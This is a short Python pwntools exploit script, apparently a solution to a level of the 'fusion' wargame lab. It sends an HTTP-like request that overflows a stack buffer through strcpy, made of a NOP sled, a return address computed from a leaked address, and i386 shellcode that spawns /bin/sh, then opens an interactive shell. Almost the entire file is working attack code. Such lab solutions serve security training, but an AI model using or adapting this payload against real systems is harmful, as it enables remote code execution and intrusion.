#!/usr/bin/python3
# ssh fusion@fusion -p 2222
from pwn import *
context.arch = 'i386'

c = remote('fusion', 20000)
s = c.recvline().decode('utf-8')
print(s)
# strcpy doesnt check bounds so we can overflow
# the buffer
address = int(s[21:32], 16)+312-17
addr = p32(address)
print(hex(address))
payload = b'GET '+b'\x90'*139
payload += addr
payload += b' HTTP/1.1'+b'\x90'*160
payload += b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80'
c.send(payload)
c.interactive()
